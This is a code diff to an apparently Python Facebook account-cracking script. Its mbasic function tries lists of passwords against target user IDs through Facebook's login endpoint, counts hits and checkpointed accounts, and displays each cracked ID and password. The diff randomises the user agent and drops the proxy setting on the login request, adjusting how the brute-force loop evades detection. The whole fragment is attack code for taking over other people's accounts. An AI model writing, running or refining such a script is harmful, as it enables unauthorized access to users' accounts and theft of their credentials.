@@ -1539,8 +1539,8 @@ def mbasic(idf,pwv):
 	global loop,ok,cp
 	prog.update(des, description=f"[[bold green] UPDATE FANKY86 [bold white]] [[bold green] {idf} [bold white]] {loop}/{len(id)} OK-:[bold green]{ok}[/] CP-:[bold yellow]{cp}[/]")
 	prog.advance(des)
-	ua = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36"
-	#ua2 = random.choice(hehesayang)
+	#ua = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36"
+	ua = random.choice(hehesayang)
 	#ua2 = random.choice(hehesayang)
 	ses = requests.Session()
 	for pw in pwv:
@@ -1605,7 +1605,7 @@ def mbasic(idf,pwv):
 				'next':''
 			}
 			login_url = 'https://vi-vn.facebook.com/login/?privacy_mutation_token=eyJ0eXBlIjowLCJjcmVhdGlvbl90aW1lIjoxNzM1NzQxNzE0LCJjYWxsc2l0ZV9pZCI6MzgxMjI5MDc5NTc1OTQ2fQ%3D%3D&next'
-			po= ses.post(login_url, headers=head, data=data, proxies=proxs)
+			po= ses.post(login_url, headers=head, data=data)
 			if "checkpoint" in ses.cookies.get_dict().keys():
 				cp += 1
 				tree = Tree(Panel.fit(f"""{K2}{idf}|{pw}{P2}""", style=f"{color_panel}"),guide_style="bold grey100")
